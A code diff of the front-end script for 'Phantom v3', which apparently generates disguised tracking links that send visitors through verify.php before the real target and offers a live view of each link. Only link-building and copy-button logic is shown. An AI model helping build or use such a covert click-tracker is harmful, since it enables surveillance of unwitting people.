@@ -1,6 +1,6 @@
 /**
- * Phantom – Homepage logic
- * Create tracking link + copy
+ * Phantom v3 – Homepage logic
+ * Generates links that go through verify.php first
  */
 
 (function () {
@@ -29,7 +29,7 @@
             return;
         }
 
-        // Validasi sederhana URL
+        // Simple URL validation
         try {
             new URL(target);
         } catch (e) {
@@ -40,23 +40,22 @@
         let id = customIdInput.value.trim();
         id = id ? sanitizeId(id) : generateId();
 
-        // DOMAIN datang dari index.php
-        const link = `${DOMAIN}/track.php?id=${encodeURIComponent(id)}&r=${encodeURIComponent(target)}`;
+        // DOMAIN comes from index.php
+        // Now points to verify.php first (Version 3)
+        const link = `${DOMAIN}/verify.php?id=${encodeURIComponent(id)}&r=${encodeURIComponent(target)}`;
         const live = `${DOMAIN}/liveview.php?id=${encodeURIComponent(id)}`;
 
         outLink.value = link;
         liveLink.href = live;
 
         resultBox.classList.remove('hidden');
-
-        // Auto scroll ke result
         resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
     });
 
     // Copy button
     copyBtn.addEventListener('click', function () {
         outLink.select();
-        outLink.setSelectionRange(0, 99999); // mobile
+        outLink.setSelectionRange(0, 99999); // for mobile
 
         try {
             document.execCommand('copy');
@@ -65,7 +64,6 @@
                 copyBtn.textContent = 'Copy';
             }, 1800);
         } catch (err) {
-            // Fallback modern
             navigator.clipboard.writeText(outLink.value).then(() => {
                 copyBtn.textContent = 'Copied!';
                 setTimeout(() => {
@@ -75,7 +73,7 @@
         }
     });
 
-    // Enter key di input
+    // Enter key support
     [targetInput, customIdInput].forEach(el => {
         el.addEventListener('keypress', function (e) {
             if (e.key === 'Enter') {
